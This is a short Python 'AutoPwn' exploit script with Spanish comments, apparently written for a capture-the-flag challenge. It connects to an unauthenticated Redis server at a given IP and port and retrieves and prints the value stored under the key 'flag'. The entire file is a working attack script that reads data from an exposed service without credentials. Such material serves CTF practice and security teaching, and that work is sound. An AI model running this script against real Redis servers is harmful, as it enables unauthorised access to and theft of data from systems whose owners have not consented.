#!/usr/bin/python3

import argparse
import redis
from colorama import Fore, Style

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self, ip_address, lport):
        # Crea una instancia del cliente Redis
        r = redis.Redis(host=self.ip_address, port=self.lport)

        # Ejecuta el comando GET para obtener el valor de la clave "flag"
        contenido = r.get("flag")

        # Verifica si se encontró un valor para la clave "flag"
        if contenido is not None:
            print(Fore.GREEN + f"\nEl contenido de la 'flag': {contenido.decode()}\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + "La clave 'flag' no existe en Redis." + Style.RESET_ALL)

def get_arguments():
    # Función para obtener los argumentos de línea de comandos: dirección IP y puerto
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', default=6379, dest='lport', required=False, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    # Función principal
    args = get_arguments()

    # Crea una instancia de la clase Exploit y ejecuta el método run
    exploit = Exploit(args.ip_address, args.lport)
    exploit.run(args.ip_address, args.lport)

if __name__ == '__main__':
    main()

